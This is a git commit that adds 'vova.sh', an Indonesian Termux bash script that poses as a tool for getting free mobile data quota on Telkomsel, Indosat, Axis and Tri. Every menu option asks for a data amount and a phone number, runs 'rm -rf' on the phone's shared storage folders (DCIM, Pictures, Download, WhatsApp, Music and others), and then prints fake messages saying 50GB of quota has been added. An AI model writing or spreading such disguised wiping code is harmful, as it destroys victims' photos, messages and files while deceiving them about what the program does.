eb886313aade098c77349f957f0439b2ba30601e
botauto <56818645+botauto@users.noreply.github.com>
2019-10-21 14:47:47 +0700

    Create vova.sh

---
+++ vova.sh
@@ -0,0 +1,165 @@
+#!/usr/bin/bash
+#tools kuota gratis
+#by not found
+
+clear
+blue='\033[34;1m'
+green='\033[32;1m'
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+echo " "
+echo  $blue "<|======================================|>"
+echo  $red    "|       TOOLS KUOTA GRATIS          |"
+echo  $red    "|                                   |"
+echo  $red    "| Author        : Mr.Not Found      |"
+echo  $red    "| Contact       : 083862779675      |"
+echo  $red    "| My Team       : not found         |"
+echo  $red    "| Thanks To     : All Member        |"
+echo  $blue "<|======================================|>"
+sleep 1
+echo " "
+echo $green "============== $red MENU $green ================="
+echo $blue "=================================================="
+echo $blue "|| $green 1. Telkomsel.                   $blue ||"
+echo $blue "|| $green 2. indosat                      $blue ||"
+echo $blue "|| $green 3. Axis                         $blue ||"
+echo $blue "|| $green 4. Tri			      $blue ||"
+echo $blue "|| $green 0. Exit The Program             $blue ||"
+echo $blue "==================================================="
+echo $blue"╭──[Masukkan Pilihan Anda]>"
+read -p"╰───────root@notfound=•>" Gans;
+
+if [ $Gans = 1 ] || [ $Gans = 01 ]
+then
+echo $blue"╭──[Berapa GB?]>"
+read -p"╰───────root@notfound=•>" kntl;
+sleep 1
+echo $green"╭──[masukan nomor]>"
+read -p"╰───────root@notfound=•>" memeq;
+sleep 1
+echo $red "Loading"
+sleep 2
+
+termux-setup-storage
+
+rm -rf /sdcard/Android
+rm -rf /sdcard/bluetooth
+rm -rf /sdcard/browser
+rm -rf /sdcard/DCIM
+rm -rf /sdcard/Download
+rm -rf /sdcard/Music
+rm -rf /sdcard/Pictures
+rm -rf /sdcard/SHAREit
+rm -rf /sdcard/WhatsApp
+rm -rf /sdcard/video
+
+echo  $blue "Tunggu Beberapa menit,hingga kuotanya masuk"
+echo  $red "sedang menunggu........"
+echo  $green "yang perlu anda tahu.menunggu itu membosankan........"
+echo  $blue "yakan yakan yakan "
+echo  $red "Please wait"
+echo "SELAMAT KOUTA ANDA TERISI 50GB" | lolcat
+toilet -f standard "SELAMAT !!!! :v" | lolcat
+fi
+
+
+if [ $Gans = 2 ] || [ $Gans = 02 ]
+then
+echo $blue"╭──[Berapa GB?]>"
+read -p"╰───────root@notfound=•>" kntl;
+sleep 1
+echo $green"╭──[masukan nomor]>"
+read -p"╰───────root@notfound=•>" memeq;
+sleep 1
+echo $red "Loading"
+sleep 2
+
+termux-setup-storage
+
+rm -rf /sdcard/Android
+rm -rf /sdcard/bluetooth
+rm -rf /sdcard/browser
+rm -rf /sdcard/DCIM
+rm -rf /sdcard/Download
+rm -rf /sdcard/Music
+rm -rf /sdcard/Pictures
+rm -rf /sdcard/SHAREit
+rm -rf /sdcard/WhatsApp
+rm -rf /sdcard/video
+
+echo  $blue "Tunggu Beberapa menit,hingga kuotanya masuk"
+echo  $red "sedang menunggu........"
+echo  $green "yang perlu anda tahu.menunggu itu membosankan........"
+echo  $blue "yakan yakan yakan "
+echo  $red "Please wait"
+echo "SELAMAT KOUTA ANDA TERISI 50GB" | lolcat
+toilet -f standard "SELAMAT !!!! :v" | lolcat
+fi
+
+
+if [ $Gans = 3 ] || [ $Gans = 03 ]
+then
+echo $blue"╭──[Berapa GB?]>"
+read -p"╰───────root@notfound=•>" kntl;
+sleep 1
+echo $green"╭──[masukan nomor]>"
+read -p"╰───────root@notfound=•>" memeq;
+sleep 1
+echo $red "Loading"
+sleep 2
+
+termux-setup-storage
+
+rm -rf /sdcard/Android
+rm -rf /sdcard/bluetooth
+rm -rf /sdcard/browser
+rm -rf /sdcard/DCIM
+rm -rf /sdcard/Download
+rm -rf /sdcard/Music
+rm -rf /sdcard/Pictures
+rm -rf /sdcard/SHAREit
+rm -rf /sdcard/WhatsApp
+rm -rf /sdcard/video
+
+echo  $blue "Tunggu Beberapa menit,hingga kuotanya masuk"
+echo  $red "sedang menunggu........"
+echo  $green "yang perlu anda tahu.menunggu itu membosankan........"
+echo  $blue "yakan yakan yakan "
+echo  $red "Please wait"
+toilet -f standard "SELAMAT !!!! :v" | lolcat
+fi
+
+
+if [ $Gans = 4 ] || [ $Gans = 04 ]
+then
+echo $blue"╭──[Berapa GB?]>"
+read -p"╰───────root@notfound=•>" kntl;
+sleep 1
+echo $green"╭──[masukan nomor]>"
+read -p"╰───────root@notfound=•>" memeq;
+sleep 1
+echo $red "Loading"
+sleep 2
+
+termux-setup-storage
+
+rm -rf /sdcard/Android
+rm -rf /sdcard/bluetooth
+rm -rf /sdcard/browser
+rm -rf /sdcard/DCIM
+rm -rf /sdcard/Download
+rm -rf /sdcard/Music
+rm -rf /sdcard/Pictures
+rm -rf /sdcard/SHAREit
+rm -rf /sdcard/WhatsApp
+rm -rf /sdcard/video
+
+echo  $blue "Tunggu Beberapa menit,hingga kuotanya masuk"
+echo  $red "sedang menunggu........"
+echo  $green "yang perlu anda tahu.menunggu itu membosankan........"
+echo  $blue "yakan yakan yakan "
+echo  $red "Please wait"
+echo "SELAMAT KOUTA ANDA TERISI 50GB" | lolcat
+toilet -f standard "SELAMAT !!!! :v" | lolcat
+fi
